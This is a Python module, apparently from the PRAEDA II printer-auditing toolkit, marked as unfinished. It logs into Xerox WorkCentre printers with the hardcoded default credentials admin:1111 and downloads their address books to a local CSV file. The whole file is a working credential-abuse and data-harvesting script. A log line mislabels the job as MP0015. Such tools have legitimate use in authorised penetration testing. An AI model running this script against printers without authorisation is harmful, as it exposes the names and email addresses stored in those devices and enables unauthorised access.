######################################################
#                 PRAEDA II Module #MP0008           #
#                  Copyright (C) 2024                #
######################################################
#   Xerox Workcentre Address book recoverey          #
#   In Progress  not completed                       #
######################################################
import requests

def MP0008(target, ports, web, output, logfile, data1):
    paths = [
        "properties/Services/EmailSettings/address.csv",
        "addressbook/exportAddressBook.php"
    ]
    auth = "YWRtaW46MTExMQ=="  # Base64 encoding of "admin:1111"
    headers = {"Authorization": f"Basic {auth}"}

    try:
        with open(f'{output}/{logfile}.log', 'a') as log_file:
            log_message = f"\n**********Attempting to enumerate Address Book from Xerox {target} : JOB MP0015**********"
            log(log_file, log_message)

            for path in paths:
                download_address_book(target, ports, web, path, output, log_file, headers)
    except Exception as e:
        print(f"Failed to open output file {output}\nError: {str(e)}")

def download_address_book(target, ports, web, path, output, log_file, headers):
    url = f"http{web}://{target}:{ports}/{path}"

    try:
        response = requests.get(url, headers=headers, timeout=120, verify=False)

        output_path = f"./{output}/{target}-{ports}-address.csv"
        with open(output_path, "a") as address_file:
            address_file.write(response.text)

        if response.ok:
            log(log_file, f"*** Path {path} SUCCESS Downloading Xerox address book to {target}-{ports}-address.csv ***")
        else:
            log(log_file, f"Path {path} FAILED - {response.status_code} : {response.reason}")
    except Exception as e:
        log(log_file, f"An error occurred: {str(e)}")

def log(log_file, message):
    print(message)
    log_file.write(message + "\n")

